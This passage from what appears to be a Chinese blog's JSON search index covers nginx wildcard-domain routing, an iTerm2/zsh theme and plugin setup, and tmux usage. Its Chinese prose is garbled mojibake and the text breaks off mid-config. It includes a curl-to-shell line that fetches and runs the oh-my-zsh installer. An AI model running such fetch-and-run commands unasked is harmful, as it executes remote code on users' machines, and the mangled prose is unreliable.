www.liuvv.com/newsè¿™ç§å½¢å¼ä¸€èˆ¬ç§°ä¹‹ä¸ºç½‘ç«™çš„å­é¡µé¢å­ç›®å½•ç­‰,å¹¶ä¸æ˜¯äºŒçº§åŸŸå.\n3. å¦å¤–ç±»ä¼¼.com.cn, .net.cn, .org.cnè¿™ç§ç§°ä¹‹ä¸ºäºŒçº§åŸŸ.\n\n##### 1.2 åŸŸåæ³›è§£æ\n\næˆ‘ä»¬çš„ç›®çš„æ˜¯å®ç°è®¿é—®äºŒçº§åŸŸååè½¬å‘è¯·æ±‚.é¦–å…ˆè¦å®ç°çš„æ˜¯äºŒçº§åŸŸåçš„é…ç½®,ä¸€èˆ¬ä½¿ç”¨Nginxæ³›è§£ææ¥å¤„ç†. æ³›è§£æå³åˆ©ç”¨é€šé…ç¬¦*æ¥åšæ¬¡çº§åŸŸåä»¥å®ç°æ‰€æœ‰çš„æ¬¡çº§åŸŸåå‡æŒ‡å‘åŒä¸€IPåœ°å€ã€‚\n\næ³›è§£æçš„ç”¨é€”æœ‰:\n\n1. å¯ä»¥è®©åŸŸåæ”¯æŒæ— é™çš„å­åŸŸå(è¿™ä¹Ÿæ˜¯æ³›åŸŸåè§£ææœ€å¤§çš„ç”¨é€”)ã€‚\n2. é˜²æ­¢ç”¨æˆ·é”™è¯¯è¾“å…¥å¯¼è‡´çš„ç½‘ç«™ä¸èƒ½è®¿é—®çš„é—®é¢˜ã€‚\n3. å¯ä»¥è®©ç›´æ¥è¾“å…¥ç½‘å€ç™»é™†ç½‘ç«™çš„ç”¨æˆ·è¾“å…¥ç®€æ´çš„ç½‘å€å³å¯è®¿é—®ç½‘ç«™ã€‚\n\n<!-- more -->\n\n##### 1.3 åŸŸåç±»å‹\n\n![1](nginxæ³›åŸŸåè§£æ/5.png)\n\n+ æ— è®ºè®°å½•ç±»å‹ä¸ºå•¥, ä¸»æœºè®°å½•éƒ½å¡«å†™ xxxxx.liuvv.com\n+ ä¸»æœºè®°å½•å°±æ˜¯åŸŸåå‰ç¼€ï¼Œå¸¸è§ç”¨æ³•æœ‰ï¼š\n  + wwwï¼šè§£æåçš„åŸŸåä¸º `www.liuvv.com`\n  + @ï¼šç›´æ¥è§£æä¸»åŸŸå `liuvv.com`\n  + \\*ï¼šæ³›è§£æï¼ŒåŒ¹é…å…¶ä»–æ‰€æœ‰åŸŸå `*.liuvv.com`\n  \n+ è®°å½•ç±»å‹çš„å«ä¹‰æ˜¯ä»€ä¹ˆï¼Ÿ\n\n  + **A è®°å½•ï¼š**åœ°å€è®°å½•ï¼Œç”¨æ¥æŒ‡å®šåŸŸåçš„ IPv4 åœ°å€ï¼ˆä¾‹å¦‚`8.8.8.8`ï¼‰ï¼Œå¦‚æœéœ€è¦å°†åŸŸåæŒ‡å‘ä¸€ä¸ª IP åœ°å€ï¼Œå°±éœ€è¦æ·»åŠ  A è®°å½•ã€‚\n\n  + **CNAME è®°å½•ï¼š** å¦‚æœéœ€è¦å°†åŸŸåæŒ‡å‘å¦ä¸€ä¸ªåŸŸåï¼Œå†ç”±å¦ä¸€ä¸ªåŸŸåæä¾› IP åœ°å€ï¼Œå°±éœ€è¦æ·»åŠ  CNAME è®°å½•ã€‚(github page å°±æ˜¯ç”¨çš„è¿™ç§)\n\n  + **NS è®°å½•ï¼š**åŸŸåæœåŠ¡å™¨è®°å½•ï¼Œå¦‚æœéœ€è¦æŠŠå­åŸŸåäº¤ç»™å…¶ä»– DNS æœåŠ¡å•†è§£æï¼Œå°±éœ€è¦æ·»åŠ  NS è®°å½•ã€‚\n\n  + **AAAA è®°å½•ï¼š**ç”¨æ¥æŒ‡å®šä¸»æœºåï¼ˆæˆ–åŸŸåï¼‰å¯¹åº”çš„ IPv6 åœ°å€ï¼ˆä¾‹å¦‚ `ff06:0:0:0:0:0:0:c3`ï¼‰è®°å½•ã€‚\n\n  + **MX è®°å½•ï¼š**å¦‚æœéœ€è¦è®¾ç½®é‚®ç®±ï¼Œè®©é‚®ç®±èƒ½æ”¶åˆ°é‚®ä»¶ï¼Œå°±éœ€è¦æ·»åŠ  MX è®°å½•ã€‚\n\n  + **TXT è®°å½•ï¼š**å¦‚æœå¸Œæœ›å¯¹åŸŸåè¿›è¡Œæ ‡è¯†å’Œè¯´æ˜ï¼Œå¯ä»¥ä½¿ç”¨ TXT è®°å½•ï¼Œç»å¤§å¤šæ•°çš„ TXT è®°å½•æ˜¯ç”¨æ¥åš SPF è®°å½•ï¼ˆååƒåœ¾é‚®ä»¶ï¼‰ã€‚\n\n  + **SRV è®°å½•ï¼š**SRV è®°å½•ç”¨æ¥æ ‡è¯†æŸå°æœåŠ¡å™¨ä½¿ç”¨äº†æŸä¸ªæœåŠ¡ï¼Œå¸¸è§äºå¾®è½¯ç³»ç»Ÿçš„ç›®å½•ç®¡ç†ã€‚ä¸»æœºè®°å½•å¤„æ ¼å¼ä¸ºï¼šæœåŠ¡çš„åå­—.åè®®çš„ç±»å‹ã€‚ä¾‹å¦‚ï¼š `_sip._tcp`ã€‚\n\n  + **éšã€æ˜¾æ€§ URL è®°å½•ï¼š**å°†ä¸€ä¸ªåŸŸåæŒ‡å‘å¦å¤–ä¸€ä¸ªå·²ç»å­˜åœ¨çš„ç«™ç‚¹ï¼Œå°±éœ€è¦æ·»åŠ  URL è®°å½•ã€‚\n\n\n+ è®°å½•å€¼å¦‚ä½•å¡«å†™ï¼Ÿ\n\n  + **A è®°å½•ï¼š**å¡«å†™æ‚¨æœåŠ¡å™¨ IPï¼Œå¦‚æœæ‚¨ä¸çŸ¥é“ï¼Œè¯·å’¨è¯¢æ‚¨çš„ç©ºé—´å•†ã€‚\n\n  + **CNAME è®°å½•ï¼š**å¡«å†™ç©ºé—´å•†ç»™æ‚¨æä¾›çš„åŸŸåï¼Œä¾‹å¦‚ï¼š`2.com`ã€‚\n\n  + **MX è®°å½•ï¼š**å¡«å†™æ‚¨é‚®ä»¶æœåŠ¡å™¨çš„ IP åœ°å€æˆ–ä¼ä¸šé‚®ç®±ç»™æ‚¨æä¾›çš„åŸŸåï¼Œå¦‚æœæ‚¨ä¸çŸ¥é“ï¼Œè¯·å’¨è¯¢æ‚¨çš„é‚®ä»¶æœåŠ¡æä¾›å•†ã€‚\n\n  + **AAAA è®°å½•ï¼š**ä¸å¸¸ç”¨ï¼Œè§£æåˆ° IPv6 çš„åœ°å€ã€‚\n\n  + **NSè®°å½•ï¼š**ä¸å¸¸ç”¨ï¼Œç³»ç»Ÿé»˜è®¤æ·»åŠ çš„ä¸¤ä¸ª NS è®°å½•è¯·ä¸è¦ä¿®æ”¹ã€‚NS å‘ä¸‹æˆæƒï¼Œå¡«å†™ DNS åŸŸåï¼Œä¾‹å¦‚ï¼š`ns3.dnsv3.com`ã€‚\n\n  + **TXT è®°å½•ï¼š**è®°å½•å€¼å¹¶æ²¡æœ‰å›ºå®šçš„æ ¼å¼ï¼Œä¸è¿‡å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼ŒTXT è®°å½•æ˜¯ç”¨æ¥åš SPF ååƒåœ¾é‚®ä»¶çš„ã€‚æœ€å…¸å‹çš„ SPF æ ¼å¼çš„ TXT è®°å½•ä¾‹å­ä¸º â€œ`v=spf1 a mx ~all`â€ï¼Œè¡¨ç¤ºåªæœ‰è¿™ä¸ªåŸŸåçš„ A è®°å½•å’Œ MX è®°å½•ä¸­çš„ IP åœ°å€æœ‰æƒé™ä½¿ç”¨è¿™ä¸ªåŸŸåå‘é€é‚®ä»¶ã€‚\n\n  + **SRV è®°å½•ï¼š**è®°å½•å€¼æ ¼å¼ä¸ºï¼šä¼˜å…ˆçº§ æƒé‡ ç«¯å£ ä¸»æœºåã€‚ä¾‹å¦‚ï¼š`0 5 5060 sipserver.example.com` ã€‚\n\n  + **éšã€æ˜¾æ€§ URL è®°å½•ï¼š**è®°å½•å€¼ä¸ºå¿…é¡»ä¸ºæ•´çš„åœ°å€ï¼ˆå¿…é¡»å¸¦æœ‰åè®®ã€åŸŸåï¼Œå¯ä»¥åŒ…å«ç«¯å£å·å’Œèµ„æºå®šä½ç¬¦ï¼‰ã€‚\n\n+ TTLå¦‚ä½•å¡«å†™\n\n  TTLå³ Time To Liveï¼Œç¼“å­˜çš„ç”Ÿå­˜æ—¶é—´ã€‚æŒ‡åœ°æ–¹ DNS ç¼“å­˜æ‚¨åŸŸåè®°å½•ä¿¡æ¯çš„æ—¶é—´ï¼Œç¼“å­˜å¤±æ•ˆåä¼šå†æ¬¡åˆ° DNSPod è·å–è®°å½•å€¼ã€‚æˆ‘ä»¬é»˜è®¤çš„ 600 ç§’æ˜¯æœ€å¸¸ç”¨çš„ï¼Œä¸ç”¨ä¿®æ”¹ã€‚\n\n  - 600ï¼ˆ10åˆ†é’Ÿï¼‰ï¼šå»ºè®®æ­£å¸¸æƒ…å†µä¸‹ä½¿ç”¨ 600ã€‚\n\n  - 60ï¼ˆ1åˆ†é’Ÿï¼‰ï¼šå¦‚æœæ‚¨ç»å¸¸ä¿®æ”¹ IPï¼Œä¿®æ”¹è®°å½•ä¸€åˆ†é’Ÿå³å¯ç”Ÿæ•ˆã€‚é•¿æœŸä½¿ç”¨ 60ï¼Œè§£æé€Ÿåº¦ä¼šç•¥å—å½±å“ã€‚\n\n  - 3600ï¼ˆ1 å°æ—¶ï¼‰ï¼šå¦‚æœæ‚¨ IP æå°‘å˜åŠ¨ï¼ˆä¸€å¹´å‡ æ¬¡ï¼‰ï¼Œå»ºè®®é€‰æ‹© 3600ï¼Œè§£æé€Ÿåº¦å¿«ã€‚å¦‚æœè¦ä¿®æ”¹ IPï¼Œæå‰ä¸€å¤©æ”¹ä¸º 60ï¼Œå³å¯å¿«é€Ÿç”Ÿæ•ˆã€‚\n\n    \n\n\n### 2. åŸŸåé…ç½®\n\n##### 2.1 é…ç½®æ³›è§£æ\n\nå»åŸŸåæä¾›å•†é‚£é‡Œå…ˆé…ç½®ä¸€ä¸ªæ³›è§£æåœ°å€,è®°å½•ç±»å‹ä¸ºA.åŸŸåæŒ‡å‘ä¸€ä¸ªIPv4åœ°å€.ä¸»æœºè®°å½•è®¾ç½®ä¸º*.è®°å½•å€¼å¡«å†™æœåŠ¡å™¨å…¬ç½‘Ipåœ°å€.\n\né…ç½®å¥½åç¨å¾®ç­‰å¾…ä¸€ä¸‹,ç„¶åè®¿é—®è¿™ä¸ªåŸŸå.å¯ä»¥éšæ„è¾“å…¥ä»»ä½•äºŒçº§åŸŸå,è®¿é—®åˆ°çš„éƒ½åº”è¯¥æ˜¯é¡¶çº§åŸŸåçš„å†…å®¹.æˆ‘è¿™é‡Œè®¿é—®ç»“æœæ€»æ˜¯Nginxçš„é»˜è®¤é¡µé¢.\n\n![1](nginxæ³›åŸŸåè§£æ/2.png)\n\n\n\n##### 2.2 nginx server_name\n\nnginx httpæ¨¡å— serveræ¨¡å—çš„ `server_name`æŒ‡ä»¤ä¸»è¦ç”¨äºé…ç½®åŸºäºåç§°çš„è™šæ‹Ÿä¸»æœº.åŒ¹é…é¡ºåºä¸åŒç»“æœä¸åŒ.\n\na. ç²¾å‡†çš„server_nameé…ç½®,å¦‚:\n\n```\nserver_name liuvv.com www.liuvv.com;\n```\n\nb. ä»¥é€šé…ç¬¦*å¼€å§‹çš„å­—ç¬¦ä¸²:\n\n```\nserver_name *.liuvv.com;\n```\n\nc. ä»¥é€šé…ç¬¦*ç»“æŸçš„å­—ç¬¦ä¸²:\n\n```\nserver_name www.*;\n```\n\nd. é…ç½®æ­£åˆ™è¡¨è¾¾å¼:\n\n```\nserver_name ~^(?.+)\\.liuvv\\.com$;\n```\n\nåŒ¹é…é¡ºåºç”±ä¸Šè‡³ä¸‹,åªè¦æœ‰ä¸€é¡¹åŒ¹é…ä»¥åå°±ä¼šåœæ­¢æœç´¢.ä½¿ç”¨æ—¶è¦æ³¨æ„è¿™ä¸ªé¡ºåº\n\n\n\n##### 2.3 ç»‘å®šå­åŸŸååˆ°ä¸åŒç›®å½•\n\né€šè¿‡åŒ¹é…subdomain, åœ¨ä¸‹é¢çš„å¯ä»¥é€šè¿‡$subdomainè¿™ä¸ªå˜é‡è·å–å½“å‰å­åŸŸåç§°ã€‚\n\n```nginx\nserver {\n        listen 80 default_server;\n        listen [::]:80 default_server;\n\n        server_name  ~^(?<subdomain>.+)\\.liuvv\\.com$;\n        root /home/levonfly/www/$subdomain;\n        index index.html;\n\n        location / {\n                try_files $uri $uri/ =404;\n        }\n\n}\n```\n\n\n\n\n![1](nginxæ³›åŸŸåè§£æ/3.png)\n\n\n\n![1](nginxæ³›åŸŸåè§£æ/4.png)\n\n\n\n##### 2.4 ç»‘å®šå­åŸŸååˆ°ä¸åŒç›®å½•(å¤šä¸ªé…ç½®æ–‡ä»¶)\n\n![1](nginxæ³›åŸŸåè§£æ/6.png)\n\n\n\n\n\n### 3. å‚è€ƒèµ„æ–™\n\n+ [Nginx æ³›è§£æé…ç½®è¯·æ±‚æ˜ å°„åˆ°å¤šç«¯å£å®ç°äºŒçº§åŸŸåè®¿é—®](https://www.cnblogs.com/summit7ca/p/6974215.html)\n+ http://www.ruanyifeng.com/blog/2016/06/dns.html\n+ https://cloud.tencent.com/document/product/302/3468","tags":["nginx"],"categories":["nginx"]},{"title":"iterm2é…ç½®zshå’Œå¸¸ç”¨æ’ä»¶","url":"%2Fp%2F6600d67c.html","content":"\nç›´æ¥çœ‹æ•ˆæœå›¾\n\n![1](iterm2_zshé…ç½®/3.png)\n\n![1](iterm2_zshé…ç½®/2.png)\n\n\n\n<!-- more -->\n\n# 1. å®‰è£…\n\n### 1.1 å®‰è£… ohmyzsh\n\n https://github.com/ohmyzsh/ohmyzsh\n\næ³¨æ„å®‰è£…ä¼šè¦†ç›– `.zshrc`, æå‰å¤‡ä»½ä¸‹\n\n```\nsh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"\n```\n\næœ‰æ•ˆé…ç½®\n\n```bash\n export ZSH=\"/Users/liuwei/.oh-my-zsh\"\n ZSH_THEME=\"robbyrussell\"\n plugins=(git)\n source $ZSH/oh-my-zsh.sh\n```\n\n\n\n### 1.2  å®‰è£…ä¸»é¢˜ powerlevel10k\n\nhttps://github.com/romkatv/powerlevel10k\n\n```bash\ngit clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k\n\n# è®¾ç½®ä¸»é¢˜  ~/.zshrc\nZSH_THEME=\"powerlevel10k/powerlevel10k\" \n```\n\n\n\n+ ä¸»é¢˜é…ç½®\n\n```bash\nPOWERLEVEL9K_MODE='nerdfont-complete'\nZSH_THEME=\"powerlevel10k/powerlevel10k\"\nPOWERLEVEL9K_CONTEXT_TEMPLATE='%n'\nPOWERLEVEL9K_CONTEXT_DEFAULT_FOREGROUND='white'\nPOWERLEVEL9K_PROMPT_ON_NEWLINE=true\nPOWERLEVEL9K_MULTILINE_LAST_PROMPT_PREFIX=\"%F{014}\\u2570%F{cyan}\\uF460%F{073}\\uF460%F{109}\\uF460%f \"\nPOWERLEVEL9K_SHORTEN_DIR_LENGTH=1\nPOWERLEVEL9K_NODE_VERSION_BACKGROUND=\"002\"\nPOWERLEVEL9K_NODE_VERSION_FOREGROUND=\"black\"\nPOWERLEVEL9K_GO_VERSION_BACKGROUND=\"001\"\nPOWERLEVEL9K_GO_VERSION_FOREGROUND=\"black\"\nPOWERLEVEL9K_WIFI_BACKGROUND=\"003\"\nPOWERLEVEL9K_WIFI_FOREGROUND=\"black\"\nPOWERLEVEL9K_LEFT_PROMPT_ELEMENTS=(os_icon context ssh dir vcs)\nPOWERLEVEL9K_RIGHT_PROMPT_ELEMENTS=(status proxy anaconda node_version go_version wifi)\n\n# çœ‹é¢œè‰²\n# for i in {0..255}; do print -Pn \"%K{$i}  %k%F{$i}${(l:3::0:)i}%f \" ${${(M)$((i%6)):#3}:+$'\\n'}; done\n```\n\n\n\n### 1.3 å®‰è£…å­—ä½“\n\n```bash\n# ä¸‹è½½æ¨èå­—ä½“\nhttps://github.com/romkatv/powerlevel10k#meslo-nerd-font-patched-for-powerlevel10k\n```\n\nä¹Ÿå¯é€‰æ‹©å…¶ä»–å­—ä½“å®‰è£…\n\n```bash\n# powerline\ngit clone https://github.com/powerline/fonts\n./install.sh\n\n# awesome-terminal-font\ngit clone https://github.com/gabrielelana/awesome-terminal-fonts\næ‰“å¼€buildæ–‡ä»¶å¤¹åŒå‡»å®‰è£…\n\n# nerd-fonts, è£…è¿™ä¸ªå³å¯\nhttps://github.com/ryanoasis/nerd-fonts/\n\nbrew tap homebrew/cask-fonts\nbrew cask install font-hack-nerd-font\n```\n\n\n\nç„¶ååœ¨iterm2é‡Œé¢ï¼ŒæŠŠå­—ä½“æ”¹æˆåç¼€ä¸ºpowerlineçš„å­—ä½“å°±è¡Œäº†\n\n![1](iterm2_zshé…ç½®/1.png)\n\n\n\n# 2. æ’ä»¶\n\n### 2.1 git\n\n```bash\n#.zshrc\nplugins=(git)\n```\n\n### 2.2 è‡ªåŠ¨è¡¥å……\n\nhttps://github.com/zsh-users/zsh-autosuggestions\n\n```bash\ngit clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions\n\n#.zshrc\nplugins=(zsh-autosuggestions)\n```\n\n### 2.3 è¯­æ³•é«˜äº®\n\nhttps://github.com/zsh-users/zsh-syntax-highlighting\n\n```bash\ngit clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting\n\n#.zshrc\nplugins=(zsh-syntax-highlighting)\n```\n\n\n\n# 3. é…è‰²\n\n\n\n### 3.1 é…è‰²é¡¹ç›®\n\n```bash\nhttps://github.com/dracula/dracula-theme/ # é€‰ç”¨çš„è¿™ä¸ª!!!å¥½çœ‹!!!æ”¯æŒå„ç§ç»ˆç«¯\nhttps://github.com/mbadolato/iTerm2-Color-Schemes # è¿™ä¸Šé¢å¥½å¤š, æ…¢æ…¢æŒ‘\nhttps://github.com/MartinSeeler/iterm2-material-design \n```\n\n\n\n### 3.2 å®‰è£…dracula\n\nhttps://github.com/dracula/iterm\n\n```bash\ngit clone https://github.com/dracula/iterm.git\n\n#Activating theme\niTerm2 > Preferences > Profiles > Colors Tab\nOpen the Color Presets... drop-down in the bottom right corner\nSelect Import... from the list\n\nSelect the Dracula.itermcolors file\nSelect the Dracula from Color Presets...\n```\n\n\n\n# 4. é‡åˆ°çš„é—®é¢˜\n\n### 4.1 å›¾æ¡ˆä¸æ˜¾ç¤º\n\n```bash\nPOWERLEVEL9K_MODE='nerdfont-complete' #è¿™å¥è¯ä¸€å®šè¦åœ¨ä¸‹é¢sourceä¹‹å‰\nsource $ZSH/oh-my-zsh.sh\n```\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ [æ‰“é€  Mac ä¸‹é«˜é¢œå€¼å¥½ç”¨çš„ç»ˆç«¯ç¯å¢ƒ](https://blog.biezhi.me/2018/11/build-a-beautiful-mac-terminal-environment.html)\n\n+ https://medium.com/@Clovis_app/configuration-of-a-beautiful-efficient-terminal-and-prompt-on-osx-in-7-minutes-827c29391961\n\n\n","tags":["iterm2"],"categories":["zsh"]},{"title":"iterm2ä¸Štmuxå’Œoh_my_tmuxçš„ä½¿ç”¨","url":"%2Fp%2F29f1e79c.html","content":"\ntmuxæ˜¯ä¸€æ¬¾ä¼˜ç§€çš„ç»ˆç«¯å¤ç”¨è½¯ä»¶ï¼Œå®ƒæ¯”Screenæ›´åŠ å¼ºå¤§ã€‚ tmuxä¹‹æ‰€ä»¥å—äººä»¬å–œçˆ±ï¼Œä¸»è¦å¾—ç›Šäºä»¥ä¸‹åŠŸèƒ½ï¼š\n\n- ä¸æ»‘åˆ†å±ï¼ˆsplitï¼‰ï¼Œè™½ç„¶iTem2ä¹Ÿæä¾›äº†æ¨ªå‘å’Œç«–å‘åˆ†å±åŠŸèƒ½ï¼Œä½†è¿™ç§åˆ†å±åŠŸèƒ½éå¸¸æ‹™åŠ£ï¼Œå®Œå…¨ç­‰åŒäºå±å¹•æ–°å¼€ä¸€ä¸ªçª—å£ï¼Œæ–°å¼€çš„paneä¸ä¼šè‡ªåŠ¨è¿›å…¥åˆ°å½“å‰ç›®å½•ï¼Œä¹Ÿæ²¡æœ‰è®°ä½å½“å‰ç™»å½•çŠ¶æ€ã€‚è¿™æ„å‘³ç€å¦‚æœæˆ‘sshè¿›å…¥åˆ°è¿œç¨‹æœåŠ¡å™¨æ—¶ï¼ŒiTem2æ–°å¼€çš„paneä¸­ï¼Œæˆ‘ä¾ç„¶è¦é‡æ–°èµ°ä¸€ésshç™»å½•çš„è€è·¯ï¼ˆomgï¼‰ã€‚tmuxå°±ä¸ä¼šè¿™æ ·ï¼Œtmuxçª—å£ä¸­ï¼Œæ–°å¼€çš„paneï¼Œé»˜è®¤è¿›å…¥åˆ°ä¹‹å‰çš„è·¯å¾„ï¼Œå¦‚æœæ˜¯sshè¿æ¥ï¼Œç™»å½•çŠ¶æ€ä¹Ÿä¾æ—§ä¿æŒç€ï¼Œå¦‚æ­¤ä¸€æ¥ï¼Œæˆ‘å°±å¯ä»¥éšæ„çš„å¢åˆ paneï¼Œè¿™ç§çµæ´»æ€§ï¼Œå¥½å¤„ä¸è¨€è€Œå–»ã€‚\n\n- ä¿æŠ¤ç°åœºï¼ˆattachï¼‰ï¼Œå³ä½¿å‘½ä»¤è¡Œçš„å·¥ä½œåªè¿›è¡Œåˆ°ä¸€åŠï¼Œå…³é—­ç»ˆç«¯åè¿˜å¯ä»¥é‡æ–°è¿›å…¥åˆ°æ“ä½œç°åœºï¼Œç»§ç»­å·¥ä½œã€‚å¯¹äºsshè¿œç¨‹è¿æ¥è€Œè¨€ï¼Œå³ä½¿ç½‘ç»œä¸ç¨³å®šä¹Ÿæ²¡æœ‰å…³ç³»ï¼Œæ‰çº¿åé‡æ–°è¿æ¥ï¼Œå¯ä»¥ç›´å¥”ç°åœºï¼Œä¹‹å‰è¿è¡Œä¸­çš„ä»»åŠ¡ï¼Œä¾æ—§åœ¨è·‘ï¼Œå°±å¥½åƒä»æ¥æ²¡æœ‰ç¦»å¼€è¿‡ä¸€æ ·ï¼›ç‰¹åˆ«æ˜¯åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šè¿è¡Œè€—æ—¶çš„ä»»åŠ¡ï¼Œtmuxå¯ä»¥å¸®ä½ ä¸€ç›´ä¿æŒä½ä¼šè¯ã€‚å¦‚æ­¤ä¸€æ¥ï¼Œä½ å°±å¯ä»¥éšæ—¶éšåœ°æ”¾å¿ƒåœ°è¿›è¡Œç§»åŠ¨åŠå…¬ï¼Œåªè¦ä½ é™„è¿‘çš„è®¡ç®—æœºè£…æœ‰tmuxï¼ˆæ²¡æœ‰ä½ ä¹Ÿå¯ä»¥èŠ±å‡ åˆ†é’Ÿè£…ä¸€ä¸ªï¼‰ï¼Œä½ å°±èƒ½ç»§ç»­åˆšæ‰çš„å·¥ä½œã€‚\n\n<!-- more -->\n\n+ å…ˆä¸Šæ•ˆæœå›¾\n\n![1](tmux/1.png)\n\n![1](tmux/2.png)\n\n\n\n# 1. å®‰è£…\n\n### 1.1 tmux å®‰è£…\n\n```bash\nbrew install tmux #mac\n\napt-get install tmux #linux\n```\n\n\n\n### 1.2 oh my tmux å®‰è£…\n\n+ https://github.com/gpakosz/.tmux\n\n```bash\ncd\ngit clone https://github.com/gpakosz/.tmux.git\nln -s -f .tmux/.tmux.conf\ncp .tmux/.tmux.conf.local .\n```\n\nä»¥åé…ç½®ä¿®æ”¹   ~/.tmux.conf.local å³å¯. \n\n\n\n# 2. tmux ä½¿ç”¨\n\ntmuxä½¿ç”¨C/Sæ¨¡å‹æ„å»ºï¼Œä¸»è¦åŒ…æ‹¬ä»¥ä¸‹å•å…ƒæ¨¡å—ï¼š\n\n- serveræœåŠ¡å™¨ã€‚è¾“å…¥tmuxå‘½ä»¤æ—¶å°±å¼€å¯äº†ä¸€ä¸ªæœåŠ¡å™¨ã€‚\n- sessionä¼šè¯ã€‚ä¸€ä¸ªæœåŠ¡å™¨å¯ä»¥åŒ…å«å¤šä¸ªä¼šè¯\n- windowçª—å£ã€‚ä¸€ä¸ªä¼šè¯å¯ä»¥åŒ…å«å¤šä¸ªçª—å£ã€‚\n- paneé¢æ¿ã€‚ä¸€ä¸ªçª—å£å¯ä»¥åŒ…å«å¤šä¸ªé¢æ¿ã€‚\n\næˆ‘ä¹ æƒ¯ä¸€ä¸ªé¡¹ç›®ç”¨ä¸€ä¸ª session, ä¸€ä¸ªå·¥ä½œåŒºç”¨ä¸€ä¸ª window, å¿«æ·æ“ä½œå¼€å§‹ä¸€ä¸ª panel. å¦‚æœåˆšå¼€å§‹è®°ä¸ä½ tmuxçš„æ“ä½œ, ä¸€å®šå¤šç»ƒä¹ , ä¸€å®šå¤šç”¨, ä½ ä¼šå‘ç°ç¦»ä¸å¼€å®ƒäº†.\n\n\n\n### 2.1 tmux å‘½ä»¤\n\n```bash\ntmux ls # æŸ¥çœ‹å½“å‰æ‰€æœ‰çš„session\n\ntmux\t# æ–°å»ºä¸€ä¸ªæ— åç§°çš„ä¼šè¯, å¯ä»¥ç”¨$å†æ”¹å\n\ntmux new -s demo # æ–°å»ºä¸€ä¸ªåç§°ä¸ºdemoçš„ä¼šè¯, \n\ntmux attach -t session_name # è¿æ¥ä¹‹å‰é€€å‡ºçš„session\n\ntmux attach-session  # å¿«é€Ÿè¿›å…¥ session\n\ntmux kill-server  #å…³é—­æœåŠ¡å™¨ï¼Œæ‰€æœ‰çš„ä¼šè¯éƒ½å°†å…³é—­\n```\n\n\n\n### 2.2 sessionæ“ä½œ\n\n+ æ–°å»º <prefix> C-c\n\n+ åˆ é™¤  :kill-session  æˆ–  tmux ls ä»¥å tmux kill-session -t åå­—\n\n+ é€‰æ‹© s\n\n+ é‡å‘½å $\n\n+ é€€å‡º  d\n\n\n\n### 2.3 window æ“ä½œ\n\n+ æ–°å»º   c\n+ å…³é—­  ctrl+d æˆ–   &\n+ åˆ—è¡¨  w   å¯åˆ‡åˆ°å…¶ä»– session\n\n+ é‡å‘½å  ,\n\n+ è·³è·ƒ  0-9\n+ å‘å·¦ C-h  æˆ–   n\n+ å‘å³ C-l  æˆ–   p\n\n\n\n### 2.4 panel æ“ä½œ\n\n+ æ–°å»ºä¸Šä¸‹   - æˆ–  \"\n\n+ æ–°å»ºå·¦å³   _  æˆ– %\n\n+ å…³é—­  ctrl+d  æˆ– x\n\n+ åˆ‡æ¢ï¼š ç©ºæ ¼é”®\n\n+ ç§»åŠ¨    hjkl é”® æˆ– ä¸Šä¸‹å·¦å³é”®\n\n+ æœ€å¤§åŒ–  z\n\n+ å˜çª—å£  !   å¦‚æœåªæ˜¯ä¸´æ—¶å˜ window, ç”¨+\n\n\n\n### 2.5 Oh My Tmux æ“ä½œ\n\n```bash\n#è‡ªåŠ¨æŠŠ ctrl + a å½“åšç¬¬äºŒä¸ªå‰ç¼€\n\n<prefix> m #åˆ‡æ¢é¼ æ ‡å¼€å¯çŠ¶æ€\n\n<prefix> e #è‡ªåŠ¨æ‰“å¼€é…ç½®\n\n<prefix> r # åˆ·æ–°é…ç½®\n\n<prefix> C-c  #æ–°å»ºä¸€ä¸ª Session\n\n<prefix> - å’Œ <prefix> _  #æ°´å¹³å’Œå‚ç›´åˆ†å±\n\n<prefix> + #è®©å½“å‰ panel æˆä¸º window, æ³¨æ„ å†ä¸€æ¬¡è¿˜èƒ½å›åˆ° panel\n```\n\n\n\n### 2.6 tmux å¤åˆ¶æ¨¡å¼\n\n```bash\nvi ~/.tmux.conf.local\n\n# æ‰“å¼€ä¸‹é¢çš„é…ç½®\nset -g mode-keys vi\n```\n\nä¾‹å¦‚æˆ‘çš„æ§åˆ¶é”®ä¸ºï¼šC-a\n\n1ã€ C-a [ è¿›å…¥å¤åˆ¶æ¨¡å¼\n\n2ã€ å‚è€ƒä¸Šè¡¨ç§»åŠ¨é¼ æ ‡åˆ°è¦å¤åˆ¶çš„åŒºåŸŸï¼Œç§»åŠ¨é¼ æ ‡æ—¶å¯ç”¨vimçš„æœç´¢åŠŸèƒ½\"/\",\"?\"\n\n3ã€ ç©ºæ ¼é”®å¼€å§‹é€‰æ‹©å¤åˆ¶åŒºåŸŸ\n\n4ã€ é€‰æ‹©å®Œæˆåå®‰enteré”®é€€å‡º\n\n5ã€ C-a ] ç²˜è´´\n\nå¦‚æœç”¨iterm2, å»ºè®®ç›´æ¥ä½¿ç”¨å®ƒçš„å¤åˆ¶æ¨¡å¼, ä½†ç”¨viçš„æœç´¢ç­‰æ“ä½œè¿˜æ˜¯å¾ˆå®ç”¨çš„\n\n\n\n# 3. é…ç½®\n\n### 3.1 tmux é…ç½®\n\n```bash\ntmux source-file ~/.tmux.conf # åˆ·æ–°é…ç½®\n\nset-option -g prefix2 `  # è®¾ç½®ä¸€ä¸ªä¸å¸¸ç”¨çš„`é”®ä½œä¸ºæŒ‡ä»¤å‰ç¼€ï¼ŒæŒ‰é”®æ›´å¿«äº›, å»ºè®®ç”¨ ctrl+a\n\nset -g mouse on  # æœ€å¥½å…³æ‰, è¦ä¸ç„¶å½±å“iterm2è‡ªå¸¦é¼ æ ‡é€‰ä¸­\n```\n\n\n\n### 3.2 tmux æ’ä»¶\n\n+ tpm æ’ä»¶ç®¡ç†\n\n  ```bash\n  git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm\n  ```\n\n  é…ç½®å‚è€ƒ:\n\n  ```bash\n  set -g @tpm_plugins '          \\\n    